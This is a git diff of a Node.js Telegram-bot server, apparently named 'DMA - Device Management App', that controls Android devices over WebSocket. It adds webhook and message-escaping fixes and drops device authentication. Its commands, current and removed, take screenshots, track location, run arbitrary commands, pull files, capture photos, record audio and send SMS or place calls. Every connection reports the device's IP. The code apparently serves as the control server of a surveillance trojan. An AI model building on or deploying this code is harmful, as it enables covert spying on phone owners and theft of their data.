@@ -22,31 +22,164 @@ if (!token || token.includes('AAHGZy_dy804ZwHoq48SnIK_OadCN2wcQxA')) {
     process.exit(1);
 }
 
+// PID file to prevent multiple instances
+const PID_FILE = path.join(__dirname, 'bot.pid');
+try {
+    if (fs.existsSync(PID_FILE)) {
+        const oldPid = fs.readFileSync(PID_FILE, 'utf8');
+        try {
+            process.kill(parseInt(oldPid), 0);
+            console.error('❌ Another bot instance is already running with PID:', oldPid);
+            process.exit(1);
+        } catch (e) {
+            console.log('🗑️ Removing stale PID file...');
+            fs.unlinkSync(PID_FILE);
+        }
+    }
+    fs.writeFileSync(PID_FILE, process.pid.toString());
+    console.log('📝 PID file created:', process.pid);
+} catch (err) {
+    console.error('PID file error:', err.message);
+}
+
+// Cleanup PID on exit
+process.on('exit', () => {
+    try {
+        if (fs.existsSync(PID_FILE)) fs.unlinkSync(PID_FILE);
+    } catch (err) {}
+});
+process.on('SIGINT', () => process.exit());
+process.on('SIGTERM', () => process.exit());
+
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server, clientTracking: true });
-const bot = new TelegramBot(token);
-// Set webhook (run once when server starts)
-const webhookUrl = `${process.env.SERVER_URL || 'https://dma-eq9s.onrender.com'}/webhook/${token}`;
-bot.setWebHook(webhookUrl);
 
-// ADD THIS ENDPOINT:
-app.post(`/webhook/${token}`, (req, res) => {
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
+// Initialize bot WITHOUT polling first
+const bot = new TelegramBot(token);
+
+// Safe Telegram message sender - FIXES MARKDOWN ERRORS
+async function safeSendMessage(chatId, text, options = {}) {
+    if (!text) return;
+    
+    // If no parse mode, send as-is
+    if (!options.parse_mode) {
+        try {
+            return await bot.sendMessage(chatId, text, options);
+        } catch (error) {
+            console.error('Send message error:', error.message);
+            return null;
+        }
+    }
+
+    // Escape function for MarkdownV2
+    const escapeMarkdownV2 = (str) => {
+        if (!str) return str;
+        // Must escape: _ * [ ] ( ) ~ ` > # + - = | { } . !
+        return str.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
+    };
+
+    // Escape function for legacy Markdown
+    const escapeMarkdown = (str) => {
+        if (!str) return str;
+        return str.replace(/([_*[\]()])/g, '\\$1');
+    };
+
+    let processedText = text;
+    if (options.parse_mode === 'MarkdownV2') {
+        processedText = escapeMarkdownV2(text);
+    } else if (options.parse_mode === 'Markdown') {
+        processedText = escapeMarkdown(text);
+    }
+
+    // Try with escaped text
+    try {
+        return await bot.sendMessage(chatId, processedText, options);
+    } catch (error) {
+        if (error.message.includes('can\'t parse entities')) {
+            console.warn('⚠️ Markdown parsing failed, sending without formatting');
+            const { parse_mode, ...plainOptions } = options;
+            // Remove markdown characters
+            const plainText = text.replace(/[*_`[\]()#]/g, '');
+            try {
+                return await bot.sendMessage(chatId, plainText, plainOptions);
+            } catch (fallbackError) {
+                console.error('❌ Even plain text failed:', fallbackError.message);
+                return null;
+            }
+        }
+        console.error('❌ Send message error:', error.message);
+        return null;
+    }
+}
+
+// Webhook setup - FIXES 409 CONFLICT
+async function setupWebhook() {
+    try {
+        const serverUrl = process.env.SERVER_URL;
+        if (!serverUrl) {
+            console.warn('⚠️ SERVER_URL not set, using polling mode with safety checks');
+            await bot.stopPolling();
+            await bot.startPolling();
+            console.log('✅ Bot started in polling mode');
+            return;
+        }
+
+        const webhookUrl = `${serverUrl}/webhook/${token}`;
+        
+        // Delete any existing webhook and drop pending updates
+        await bot.deleteWebHook();
+        
+        // Set new webhook
+        await bot.setWebHook(webhookUrl, {
+            allowed_updates: ['message', 'callback_query', 'inline_query']
+        });
+        
+        const webhookInfo = await bot.getWebHookInfo();
+        console.log('✅ Webhook set successfully');
+        console.log('🌐 Webhook URL:', webhookInfo.url);
+        console.log('📊 Pending updates:', webhookInfo.pending_update_count);
+        console.log('⏱️  Max connections:', webhookInfo.max_connections);
+        
+    } catch (error) {
+        console.error('❌ Webhook setup failed:', error.message);
+        console.log('⚠️ Falling back to polling mode...');
+        try {
+            await bot.stopPolling();
+            await bot.startPolling();
+            console.log('✅ Bot started in polling mode');
+        } catch (pollingError) {
+            console.error('❌ Polling also failed:', pollingError.message);
+            process.exit(1);
+        }
+    }
+}
+
+// Webhook endpoint
+app.post(`/webhook/${token}`, express.json(), (req, res) => {
+    try {
+        bot.processUpdate(req.body);
+        res.sendStatus(200);
+    } catch (error) {
+        console.error('Webhook processing error:', error);
+        res.sendStatus(200); // Still return 200 to prevent retries
+    }
 });
+
 // Security middleware
-app.use(helmet());
+app.use(helmet({
+    contentSecurityPolicy: false,
+}));
 app.use(express.json({ limit: '10mb' }));
 
 // Data structures
-const connectedDevices = new Map(); // deviceId -> {ws, deviceInfo, lastSeen}
-const pendingCommands = new Map(); // deviceId -> [commands]
-const userSessions = new Map(); // userId -> {state, data, deviceId}
+const connectedDevices = new Map();
+const pendingCommands = new Map();
+const userSessions = new Map();
 
 // Create necessary directories
 ['uploads', 'logs', 'screenshots'].forEach(dir => {
-    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
 });
 
 // File upload configuration
@@ -61,7 +194,7 @@ const storage = multer.diskStorage({
         const deviceId = req.headers['device-id'] || 'unknown';
         const ext = path.extname(file.originalname);
         const name = path.basename(file.originalname, ext);
-        const safeName = `${deviceId}-${Date.now()}-${name}${ext}`;
+        const safeName = `${deviceId}-${Date.now()}-${name}${ext}`.replace(/[^a-zA-Z0-9.-]/g, '_');
         cb(null, safeName);
     }
 });
@@ -83,7 +216,11 @@ const upload = multer({
 function logEvent(event, deviceId = 'system', details = '') {
     const timestamp = new Date().toISOString();
     const logEntry = `[${timestamp}] [${deviceId}] ${event}: ${details}\n`;
-    fs.appendFileSync('logs/server.log', logEntry);
+    try {
+        fs.appendFileSync('logs/server.log', logEntry);
+    } catch (err) {
+        console.error('Log write error:', err.message);
+    }
     console.log(logEntry.trim());
 }
 
@@ -92,27 +229,19 @@ async function setupBotCommands() {
     const commands = [
         { command: 'start', description: 'Start the DMA bot' },
         { command: 'list', description: 'List connected devices' },
-        { command: 'info', description: 'Get device info (requires device ID)' },
+        { command: 'info', description: 'Get device info' },
         { command: 'cmd', description: 'Execute command on device' },
-        { command: 'file', description: 'Get file from device' },
         { command: 'screen', description: 'Take screenshot' },
-        { command: 'call', description: 'Make a call' },
-        { command: 'sms', description: 'Send SMS' },
-        { command: 'apps', description: 'List installed apps' },
         { command: 'location', description: 'Get location' },
-        { command: 'camera', description: 'Take photo' },
-        { command: 'record', description: 'Record audio' },
-        { command: 'shell', description: 'Run shell command' },
-        { command: 'files', description: 'Browse files' },
-        { command: 'contacts', description: 'Get contacts' },
-        { command: 'messages', description: 'Get messages' },
-        { command: 'settings', description: 'Device settings' },
-        { command: 'help', description: 'Show help message' },
-        { command: 'keyboard', description: 'Show interactive keyboard' }
+        { command: 'help', description: 'Show help message' }
     ];
 
-    await bot.setMyCommands(commands);
-    console.log('✅ Bot commands set up successfully');
+    try {
+        await bot.setMyCommands(commands);
+        console.log('✅ Bot commands set up successfully');
+    } catch (error) {
+        console.error('❌ Failed to set commands:', error.message);
+    }
 }
 
 // Interactive keyboards
@@ -123,77 +252,9 @@ const mainKeyboard = {
             [{ text: '📸 Screenshot' }, { text: '📍 Location' }],
             [{ text: '📁 Files' }, { text: '📞 Call' }],
             [{ text: '💬 SMS' }, { text: '📷 Camera' }],
-            [{ text: '🎤 Record' }, { text: '📱 Apps' }],
-            [{ text: '⚙️ Settings' }, { text: '❓ Help' }]
+            [{ text: '❓ Help' }]
         ],
-        resize_keyboard: true,
-        one_time_keyboard: false
-    }
-};
-
-const deviceSelectionKeyboard = (devices) => {
-    const buttons = [];
-    devices.forEach((device, id) => {
-        buttons.push([{ 
-            text: `${device.deviceInfo.model} (${id.substring(0, 8)}...)` 
-        }]);
-    });
-    buttons.push([{ text: '🔙 Back to Main Menu' }]);
-    
-    return {
-        reply_markup: {
-            keyboard: buttons,
-            resize_keyboard: true,
-            one_time_keyboard: true
-        }
-    };
-};
-
-const cameraTypeKeyboard = {
-    reply_markup: {
-        keyboard: [
-            [{ text: '📷 Front Camera' }, { text: '📷 Rear Camera' }],
-            [{ text: '🔙 Back' }]
-        ],
-        resize_keyboard: true,
-        one_time_keyboard: true
-    }
-};
-
-const fileActionsKeyboard = {
-    reply_markup: {
-        keyboard: [
-            [{ text: '📥 Download' }, { text: '🗑️ Delete' }],
-            [{ text: '📁 List Files' }, { text: '📊 Get Info' }],
-            [{ text: '🔙 Back' }]
-        ],
-        resize_keyboard: true,
-        one_time_keyboard: true
-    }
-};
-
-const recordDurationKeyboard = {
-    reply_markup: {
-        keyboard: [
-            [{ text: '⏱️ 10 seconds' }, { text: '⏱️ 30 seconds' }],
-            [{ text: '⏱️ 1 minute' }, { text: '⏱️ 5 minutes' }],
-            [{ text: '🔙 Back' }]
-        ],
-        resize_keyboard: true,
-        one_time_keyboard: true
-    }
-};
-
-const settingsKeyboard = {
-    reply_markup: {
-        keyboard: [
-            [{ text: '🔔 Notification Settings' }, { text: '📊 Auto Report' }],
-            [{ text: '🔐 Security Settings' }, { text: '⚡ Performance' }],
-            [{ text: '🔄 Update Interval' }, { text: '🗑️ Clear Data' }],
-            [{ text: '🔙 Back' }]
-        ],
-        resize_keyboard: true,
-        one_time_keyboard: true
+        resize_keyboard: true
     }
 };
 
@@ -203,31 +264,16 @@ const removeKeyboard = {
     }
 };
 
-// User session management
-function setUserSession(userId, data) {
-    userSessions.set(userId, { ...data, timestamp: Date.now() });
-}
-
-function getUserSession(userId) {
-    return userSessions.get(userId);
-}
-
-function clearUserSession(userId) {
-    userSessions.delete(userId);
-}
-
 // WebSocket connection handler
 wss.on('connection', (ws, req) => {
     try {
-        const authToken = req.headers['authorization'];
         const deviceId = req.headers['device-id'];
         const deviceModel = req.headers['device-model'] || 'Unknown';
         const androidVersion = req.headers['android-version'] || 'Unknown';
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-        // Basic authentication
-        if (!deviceId || !authToken) {
-            ws.close(1008, 'Missing credentials');
+        if (!deviceId) {
+            ws.close(1008, 'Missing device ID');
             return;
         }
 
@@ -243,17 +289,15 @@ wss.on('connection', (ws, req) => {
         ws.deviceId = deviceId;
         connectedDevices.set(deviceId, { ws, deviceInfo, lastSeen: Date.now() });
 
-        // Send welcome message to Telegram
-        const message = `
-📱 *New Device Connected - DMA*
-• *Device:* ${deviceModel}
-• *Android:* ${androidVersion}
-• *ID:* \`${deviceId}\`
-• *IP:* ${ip}
-• *Time:* ${new Date().toLocaleString()}
-        `;
+        // Send welcome message to Telegram - SAFE SEND
+        const message = `📱 New Device Connected
+• Device: ${deviceModel}
+• Android: ${androidVersion}
+• ID: ${deviceId}
+• IP: ${ip}
+• Time: ${new Date().toLocaleString()}`;
 
-        bot.sendMessage(adminId, message, { parse_mode: 'Markdown' });
+        safeSendMessage(adminId, message);
         logEvent('DEVICE_CONNECTED', deviceId, `${deviceModel} (${androidVersion})`);
 
         // Handle incoming messages
@@ -264,24 +308,16 @@ wss.on('connection', (ws, req) => {
             } catch (error) {
                 console.error('Message parse error:', error);
             }
-            connectedDevices.get(deviceId).lastSeen = Date.now();
+            const device = connectedDevices.get(deviceId);
+            if (device) device.lastSeen = Date.now();
         });
 
         // Handle disconnection
         ws.on('close', () => {
             connectedDevices.delete(deviceId);
-            bot.sendMessage(adminId, `📴 Device disconnected: \`${deviceId}\``, { parse_mode: 'Markdown' });
+            safeSendMessage(adminId, `📴 Device disconnected: ${deviceId}`);
             logEvent('DEVICE_DISCONNECTED', deviceId);
         });
-
-        // Send pending commands
-        if (pendingCommands.has(deviceId)) {
-            const commands = pendingCommands.get(deviceId);
-            commands.forEach(cmd => {
-                ws.send(JSON.stringify(cmd));
-            });
-            pendingCommands.delete(deviceId);
-        }
 
         // Send initial command to get device info
         ws.send(JSON.stringify({
@@ -313,7 +349,7 @@ function handleDeviceMessage(deviceId, message) {
             updateDeviceInfo(deviceId, message.data);
             break;
         case 'error':
-            bot.sendMessage(adminId, `❌ Error from ${deviceId}:\n\`${message.error}\``, { parse_mode: 'Markdown' });
+            safeSendMessage(adminId, `❌ Error from ${deviceId}:\n${message.error}`);
             break;
         default:
             console.log('Unknown message type:', message.type);
@@ -325,7 +361,7 @@ function updateDeviceInfo(deviceId, info) {
     const device = connectedDevices.get(deviceId);
     if (device) {
         device.deviceInfo = { ...device.deviceInfo, ...info };
-        bot.sendMessage(adminId, `📊 Device Info Update:\n\`${JSON.stringify(info, null, 2)}\``, { parse_mode: 'Markdown' });
+        safeSendMessage(adminId, `📊 Device Info Update:\n${JSON.stringify(info, null, 2)}`);
     }
 }
 
@@ -333,16 +369,19 @@ function updateDeviceInfo(deviceId, info) {
 function handleCommandResponse(deviceId, response) {
     if (response.success) {
         if (response.data) {
-            bot.sendMessage(adminId, `✅ Command executed on ${deviceId}\nResult: \`${JSON.stringify(response.data)}\``, { parse_mode: 'Markdown' });
+            const dataStr = typeof response.data === 'string' 
+                ? response.data 
+                : JSON.stringify(response.data, null, 2);
+            safeSendMessage(adminId, `✅ Command executed on ${deviceId}\nResult: ${dataStr.substring(0, 1000)}${dataStr.length > 1000 ? '...' : ''}`);
         }
     } else {
-        bot.sendMessage(adminId, `❌ Command failed on ${deviceId}\nError: ${response.error}`, { parse_mode: 'Markdown' });
+        safeSendMessage(adminId, `❌ Command failed on ${deviceId}\nError: ${response.error || 'Unknown error'}`);
     }
 }
 
 // Handle file upload notifications
 function handleFileUpload(deviceId, message) {
-    bot.sendMessage(adminId, `📁 File uploaded from ${deviceId}\nType: ${message.fileType}\nPath: ${message.filePath}`, { parse_mode: 'Markdown' });
+    safeSendMessage(adminId, `📁 File uploaded from ${deviceId}\nType: ${message.fileType || 'unknown'}\nPath: ${message.filePath || 'unknown'}`);
 }
 
 // Send command to device
@@ -374,42 +413,29 @@ bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
     
     if (chatId.toString() !== adminId) {
-        bot.sendMessage(chatId, '⛔ Unauthorized access');
+        safeSendMessage(chatId, '⛔ Unauthorized access');
         return;
     }
     
-    // Setup commands
     await setupBotCommands();
     
-    const welcome = `
-🤖 *DMA - Device Management App*
+    const welcome = `🤖 DMA - Device Management App
+
+Welcome to the Device Management System!
+
+Available Commands:
+/list - Show connected devices
+/screen [device_id] - Take screenshot
+/location [device_id] - Get location
+/cmd [device_id] [command] - Execute command
+/help - Show help
+
+Quick Start:
+1. Check connected devices with /list
+2. Copy device ID from list
+3. Use commands with device ID`;
     
-Welcome to the Device Management System! You can control all connected devices from here.
-
-*Available Commands:*
-• Use buttons below for quick actions
-• Type commands like /list, /info, etc.
-• Or use the interactive keyboard
-
-*Quick Start:*
-1. First, check connected devices with /list
-2. Select a device from the list
-3. Use buttons to perform actions
-
-*Note:* Some features require specific permissions on the device.
-    `;
-    
-    bot.sendMessage(chatId, welcome, { 
-        parse_mode: 'Markdown',
-        reply_markup: mainKeyboard.reply_markup 
-    });
-});
-
-bot.onText(/\/keyboard/, (msg) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    bot.sendMessage(chatId, '🔄 Showing interactive keyboard...', mainKeyboard);
+    safeSendMessage(chatId, welcome, mainKeyboard);
 });
 
 bot.onText(/\/list/, (msg) => {
@@ -417,552 +443,20 @@ bot.onText(/\/list/, (msg) => {
     if (chatId.toString() !== adminId) return;
     
     if (connectedDevices.size === 0) {
-        bot.sendMessage(chatId, '📭 No devices connected', removeKeyboard);
+        safeSendMessage(chatId, '📭 No devices connected', removeKeyboard);
         return;
     }
     
-    let response = `📱 *Connected Devices (${connectedDevices.size}):*\n\n`;
+    let response = `📱 Connected Devices (${connectedDevices.size}):\n\n`;
     connectedDevices.forEach((device, id) => {
         const uptime = Math.floor((Date.now() - device.lastSeen) / 60000);
-        response += `• *${device.deviceInfo.model}*\n`;
-        response += `  ID: \`${id}\`\n`;
-        response += `  Android: ${device.deviceInfo.androidVersion}\n`;
-        response += `  Uptime: ${uptime} mins\n`;
-        response += `  IP: ${device.deviceInfo.ip}\n\n`;
+        response += `• ${device.deviceInfo.model || 'Unknown'}\n`;
+        response += `  ID: ${id}\n`;
+        response += `  Android: ${device.deviceInfo.androidVersion || 'Unknown'}\n`;
+        response += `  Active: ${uptime} mins ago\n\n`;
     });
     
-    bot.sendMessage(chatId, response, { 
-        parse_mode: 'Markdown',
-        reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
-    });
-});
-
-// Interactive button handlers
-bot.on('message', (msg) => {
-    const chatId = msg.chat.id;
-    const text = msg.text;
-    
-    if (chatId.toString() !== adminId) return;
-    
-    if (!text) return;
-    
-    const session = getUserSession(chatId);
-    
-    // Handle button clicks
-    switch (text) {
-        case '📱 List Devices':
-            bot.sendMessage(chatId, '📱 Selecting device...', deviceSelectionKeyboard(connectedDevices));
-            break;
-            
-        case '🔙 Back to Main Menu':
-            bot.sendMessage(chatId, '🔙 Returning to main menu...', mainKeyboard);
-            clearUserSession(chatId);
-            break;
-            
-        case '🔙 Back':
-            if (session && session.lastState === 'camera') {
-                bot.sendMessage(chatId, 'Select action:', mainKeyboard);
-                clearUserSession(chatId);
-            } else {
-                bot.sendMessage(chatId, '🔙 Back to main menu', mainKeyboard);
-                clearUserSession(chatId);
-            }
-            break;
-            
-        case '📸 Screenshot':
-            if (connectedDevices.size === 0) {
-                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
-                return;
-            }
-            setUserSession(chatId, { state: 'awaiting_device_for_screenshot' });
-            bot.sendMessage(chatId, '📸 Select device for screenshot:', deviceSelectionKeyboard(connectedDevices));
-            break;
-            
-        case '📍 Location':
-            if (connectedDevices.size === 0) {
-                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
-                return;
-            }
-            setUserSession(chatId, { state: 'awaiting_device_for_location' });
-            bot.sendMessage(chatId, '📍 Select device for location:', deviceSelectionKeyboard(connectedDevices));
-            break;
-            
-        case '📷 Camera':
-            if (connectedDevices.size === 0) {
-                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
-                return;
-            }
-            setUserSession(chatId, { state: 'awaiting_device_for_camera' });
-            bot.sendMessage(chatId, '📷 Select device for camera:', deviceSelectionKeyboard(connectedDevices));
-            break;
-            
-        case '📷 Front Camera':
-            if (session && session.deviceId) {
-                sendCommandToDevice(session.deviceId, 'take_photo', { camera: 'front' });
-                bot.sendMessage(chatId, `📷 Taking front camera photo on ${session.deviceId.substring(0, 8)}...`);
-                clearUserSession(chatId);
-            }
-            break;
-            
-        case '📷 Rear Camera':
-            if (session && session.deviceId) {
-                sendCommandToDevice(session.deviceId, 'take_photo', { camera: 'rear' });
-                bot.sendMessage(chatId, `📷 Taking rear camera photo on ${session.deviceId.substring(0, 8)}...`);
-                clearUserSession(chatId);
-            }
-            break;
-            
-        case '🎤 Record':
-            if (connectedDevices.size === 0) {
-                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
-                return;
-            }
-            setUserSession(chatId, { state: 'awaiting_device_for_record' });
-            bot.sendMessage(chatId, '🎤 Select device for recording:', deviceSelectionKeyboard(connectedDevices));
-            break;
-            
-        case '⏱️ 10 seconds':
-            if (session && session.deviceId) {
-                sendCommandToDevice(session.deviceId, 'record_audio', { seconds: 10 });
-                bot.sendMessage(chatId, `🎤 Recording 10 seconds on ${session.deviceId.substring(0, 8)}...`);
-                clearUserSession(chatId);
-            }
-            break;
-            
-        case '⏱️ 30 seconds':
-            if (session && session.deviceId) {
-                sendCommandToDevice(session.deviceId, 'record_audio', { seconds: 30 });
-                bot.sendMessage(chatId, `🎤 Recording 30 seconds on ${session.deviceId.substring(0, 8)}...`);
-                clearUserSession(chatId);
-            }
-            break;
-            
-        case '⏱️ 1 minute':
-            if (session && session.deviceId) {
-                sendCommandToDevice(session.deviceId, 'record_audio', { seconds: 60 });
-                bot.sendMessage(chatId, `🎤 Recording 1 minute on ${session.deviceId.substring(0, 8)}...`);
-                clearUserSession(chatId);
-            }
-            break;
-            
-        case '⏱️ 5 minutes':
-            if (session && session.deviceId) {
-                sendCommandToDevice(session.deviceId, 'record_audio', { seconds: 300 });
-                bot.sendMessage(chatId, `🎤 Recording 5 minutes on ${session.deviceId.substring(0, 8)}...`);
-                clearUserSession(chatId);
-            }
-            break;
-            
-        case '📁 Files':
-            if (connectedDevices.size === 0) {
-                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
-                return;
-            }
-            setUserSession(chatId, { state: 'awaiting_device_for_files' });
-            bot.sendMessage(chatId, '📁 Select device to browse files:', deviceSelectionKeyboard(connectedDevices));
-            break;
-            
-        case '📞 Call':
-            if (connectedDevices.size === 0) {
-                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
-                return;
-            }
-            setUserSession(chatId, { state: 'awaiting_device_for_call' });
-            bot.sendMessage(chatId, '📞 Select device to make call:', deviceSelectionKeyboard(connectedDevices));
-            break;
-            
-        case '💬 SMS':
-            if (connectedDevices.size === 0) {
-                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
-                return;
-            }
-            setUserSession(chatId, { state: 'awaiting_device_for_sms' });
-            bot.sendMessage(chatId, '💬 Select device to send SMS:', deviceSelectionKeyboard(connectedDevices));
-            break;
-            
-        case '📱 Apps':
-            if (connectedDevices.size === 0) {
-                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
-                return;
-            }
-            setUserSession(chatId, { state: 'awaiting_device_for_apps' });
-            bot.sendMessage(chatId, '📱 Select device to list apps:', deviceSelectionKeyboard(connectedDevices));
-            break;
-            
-        case '⚙️ Settings':
-            bot.sendMessage(chatId, '⚙️ Device Settings:', settingsKeyboard);
-            break;
-            
-        case '❓ Help':
-            showHelp(chatId);
-            break;
-            
-        case '📥 Download':
-            if (session && session.deviceId && session.filePath) {
-                sendCommandToDevice(session.deviceId, 'download_file', { path: session.filePath });
-                bot.sendMessage(chatId, `📥 Downloading file from ${session.deviceId.substring(0, 8)}...`);
-                clearUserSession(chatId);
-            }
-            break;
-            
-        default:
-            // Check if it's a device selection
-            if (text.includes('...') && session) {
-                handleDeviceSelection(chatId, text, session);
-            } else if (session && session.state === 'awaiting_call_number') {
-                handleCallNumber(chatId, text, session);
-            } else if (session && session.state === 'awaiting_sms_number') {
-                handleSmsNumber(chatId, text, session);
-            } else if (session && session.state === 'awaiting_sms_message') {
-                handleSmsMessage(chatId, text, session);
-            } else if (session && session.state === 'awaiting_command') {
-                handleCustomCommand(chatId, text, session);
-            } else if (session && session.state === 'awaiting_file_path') {
-                handleFilePath(chatId, text, session);
-            }
-    }
-});
-
-// Handle device selection from keyboard
-function handleDeviceSelection(chatId, text, session) {
-    const deviceEntry = Array.from(connectedDevices.entries()).find(([id, device]) => 
-        text.includes(device.deviceInfo.model) && text.includes(id.substring(0, 8))
-    );
-    
-    if (!deviceEntry) {
-        bot.sendMessage(chatId, '❌ Device not found', removeKeyboard);
-        clearUserSession(chatId);
-        return;
-    }
-    
-    const [deviceId, device] = deviceEntry;
-    const shortId = deviceId.substring(0, 8);
-    
-    switch (session.state) {
-        case 'awaiting_device_for_screenshot':
-            sendCommandToDevice(deviceId, 'take_screenshot');
-            bot.sendMessage(chatId, `📸 Taking screenshot on ${device.deviceInfo.model} (${shortId})...`);
-            clearUserSession(chatId);
-            break;
-            
-        case 'awaiting_device_for_location':
-            sendCommandToDevice(deviceId, 'get_location');
-            bot.sendMessage(chatId, `📍 Getting location from ${device.deviceInfo.model} (${shortId})...`);
-            clearUserSession(chatId);
-            break;
-            
-        case 'awaiting_device_for_camera':
-            setUserSession(chatId, { 
-                state: 'awaiting_camera_type', 
-                deviceId: deviceId,
-                lastState: 'camera'
-            });
-            bot.sendMessage(chatId, `📷 Select camera type for ${device.deviceInfo.model}:`, cameraTypeKeyboard);
-            break;
-            
-        case 'awaiting_device_for_record':
-            setUserSession(chatId, { 
-                state: 'awaiting_record_duration', 
-                deviceId: deviceId
-            });
-            bot.sendMessage(chatId, `🎤 Select recording duration for ${device.deviceInfo.model}:`, recordDurationKeyboard);
-            break;
-            
-        case 'awaiting_device_for_files':
-            setUserSession(chatId, { 
-                state: 'awaiting_file_path', 
-                deviceId: deviceId
-            });
-            bot.sendMessage(chatId, `📁 Enter file path to browse on ${device.deviceInfo.model}:\nExample: /storage/emulated/0/Downloads`, removeKeyboard);
-            break;
-            
-        case 'awaiting_device_for_call':
-            setUserSession(chatId, { 
-                state: 'awaiting_call_number', 
-                deviceId: deviceId
-            });
-            bot.sendMessage(chatId, `📞 Enter phone number to call from ${device.deviceInfo.model}:`, removeKeyboard);
-            break;
-            
-        case 'awaiting_device_for_sms':
-            setUserSession(chatId, { 
-                state: 'awaiting_sms_number', 
-                deviceId: deviceId
-            });
-            bot.sendMessage(chatId, `💬 Enter phone number to send SMS from ${device.deviceInfo.model}:`, removeKeyboard);
-            break;
-            
-        case 'awaiting_device_for_apps':
-            sendCommandToDevice(deviceId, 'list_apps');
-            bot.sendMessage(chatId, `📱 Getting apps list from ${device.deviceInfo.model} (${shortId})...`);
-            clearUserSession(chatId);
-            break;
-            
-        default:
-            // Generic device selection - show actions menu
-            setUserSession(chatId, { 
-                state: 'device_selected', 
-                deviceId: deviceId
-            });
-            
-            const deviceMenu = `
-📱 *${device.deviceInfo.model}*
-ID: \`${shortId}...\`
-Android: ${device.deviceInfo.androidVersion}
-IP: ${device.deviceInfo.ip}
-
-*Available Actions:*
-1. 📸 Take Screenshot
-2. 📍 Get Location  
-3. 📷 Take Photo
-4. 🎤 Record Audio
-5. 📁 Browse Files
-6. 📞 Make Call
-7. 💬 Send SMS
-8. 📱 List Apps
-9. ⚡ Run Command
-            `;
-            
-            bot.sendMessage(chatId, deviceMenu, { 
-                parse_mode: 'Markdown',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📸 Screenshot', callback_data: `screenshot_${deviceId}` },
-                            { text: '📍 Location', callback_data: `location_${deviceId}` }
-                        ],
-                        [
-                            { text: '📷 Camera', callback_data: `camera_${deviceId}` },
-                            { text: '🎤 Record', callback_data: `record_${deviceId}` }
-                        ],
-                        [
-                            { text: '📁 Files', callback_data: `files_${deviceId}` },
-                            { text: '📞 Call', callback_data: `call_${deviceId}` }
-                        ],
-                        [
-                            { text: '💬 SMS', callback_data: `sms_${deviceId}` },
-                            { text: '📱 Apps', callback_data: `apps_${deviceId}` }
-                        ],
-                        [
-                            { text: '⚡ Command', callback_data: `cmd_${deviceId}` }
-                        ]
-                    ]
-                }
-            });
-    }
-}
-
-// Handle call number input
-function handleCallNumber(chatId, text, session) {
-    const phoneNumber = text.trim();
-    
-    if (!phoneNumber.match(/^[\d\s\-\+\(\)]{5,}$/)) {
-        bot.sendMessage(chatId, '❌ Invalid phone number format. Please enter a valid number:');
-        return;
-    }
-    
-    sendCommandToDevice(session.deviceId, 'make_call', { number: phoneNumber });
-    bot.sendMessage(chatId, `📞 Calling ${phoneNumber} on device...`);
-    clearUserSession(chatId);
-}
-
-// Handle SMS number input
-function handleSmsNumber(chatId, text, session) {
-    const phoneNumber = text.trim();
-    
-    if (!phoneNumber.match(/^[\d\s\-\+\(\)]{5,}$/)) {
-        bot.sendMessage(chatId, '❌ Invalid phone number format. Please enter a valid number:');
-        return;
-    }
-    
-    setUserSession(chatId, { 
-        state: 'awaiting_sms_message', 
-        deviceId: session.deviceId,
-        phoneNumber: phoneNumber
-    });
-    
-    bot.sendMessage(chatId, `💬 Enter SMS message for ${phoneNumber}:`);
-}
-
-// Handle SMS message input
-function handleSmsMessage(chatId, text, session) {
-    const message = text.trim();
-    
-    if (message.length === 0) {
-        bot.sendMessage(chatId, '❌ Message cannot be empty. Please enter SMS message:');
-        return;
-    }
-    
-    sendCommandToDevice(session.deviceId, 'send_sms', { 
-        number: session.phoneNumber, 
-        message: message 
-    });
-    
-    bot.sendMessage(chatId, `💬 Sending SMS to ${session.phoneNumber} on device...`);
-    clearUserSession(chatId);
-}
-
-// Handle custom command input
-function handleCustomCommand(chatId, text, session) {
-    const command = text.trim();
-    
-    if (command.length === 0) {
-        bot.sendMessage(chatId, '❌ Command cannot be empty. Please enter command:');
-        return;
-    }
-    
-    sendCommandToDevice(session.deviceId, 'execute', { cmd: command });
-    bot.sendMessage(chatId, `⚡ Executing command on device...\n\`${command}\``, { parse_mode: 'Markdown' });
-    clearUserSession(chatId);
-}
-
-// Handle file path input
-function handleFilePath(chatId, text, session) {
-    const filePath = text.trim();
-    
-    if (filePath.length === 0) {
-        bot.sendMessage(chatId, '❌ Path cannot be empty. Please enter file path:');
-        return;
-    }
-    
-    // Check if it's a special command
-    if (filePath.startsWith('/')) {
-        // Handle command
-        switch(filePath) {
-            case '/list':
-                sendCommandToDevice(session.deviceId, 'list_files', { path: '/' });
-                bot.sendMessage(chatId, `📁 Listing root directory on device...`);
-                break;
-            case '/downloads':
-                sendCommandToDevice(session.deviceId, 'list_files', { path: '/storage/emulated/0/Downloads' });
-                bot.sendMessage(chatId, `📁 Listing Downloads on device...`);
-                break;
-            case '/pictures':
-                sendCommandToDevice(session.deviceId, 'list_files', { path: '/storage/emulated/0/Pictures' });
-                bot.sendMessage(chatId, `📁 Listing Pictures on device...`);
-                break;
-            default:
-                sendCommandToDevice(session.deviceId, 'list_files', { path: filePath });
-                bot.sendMessage(chatId, `📁 Listing ${filePath} on device...`);
-        }
-    } else {
-        setUserSession(chatId, { 
-            state: 'file_selected', 
-            deviceId: session.deviceId,
-            filePath: filePath
-        });
-        
-        bot.sendMessage(chatId, `📁 File selected: ${filePath}\nChoose action:`, fileActionsKeyboard);
-    }
-}
-
-// Handle inline keyboard callbacks
